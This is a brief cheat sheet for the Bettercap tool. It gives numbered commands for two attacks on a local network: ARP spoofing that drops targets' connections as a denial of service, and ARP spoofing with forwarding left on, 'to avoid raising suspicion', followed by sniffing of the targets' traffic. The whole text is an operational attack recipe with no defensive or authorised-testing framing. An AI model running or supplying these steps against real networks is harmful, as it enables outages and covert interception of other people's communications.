Prerequisite: "sudo apt install bettercap"

Launch Bettercap: "sudo bettercap"

Useful commands:
- Show settings: "get <command to search>*"
E.g: "get arp.spoof*"

*Cut off one, many or all internet connections in a network (Denial Of Service):

1. "net.probe on" - Start probing every IPs to detect those that are in use within the network.

2. (optional) "net.show" - Show list of alive IPs. Can be extremely useful for detecting the intended target.

3. "set arp.spoof.targets <IP or range>" - set target(s) to attack. Leave unset to attack hosts.

4. "set arp.spoof.forwarding false" - disallow intercepted packets to continue, dropping the targets' connection.

5. "set arp.spoof.fullduplex true" - spoof both the targets and the gateway.

6. "arp.spoof on" - start DOSing.

*Sniff on a device's network activity:

1. "net.probe on" - Start probing every IPs to detect those that are in use within the network.

2. (optional) "net.show" - Show list of alive IPs. Can be extremely useful for detecting the intended target.

3. "set arp.spoof.targets <IP or range>" - set target(s) to attack. Leave unset to attack hosts.

4. "set arp.spoof.forwarding true" - allow intercepted packets to continue, avoid raising suspicion.

5. "set arp.spoof.fullduplex true" - spoof both the targets and the gateway.

6. "arp.spoof on" - start ARP Spoofing.

7. "net.sniff on" - start sniffing on packets.
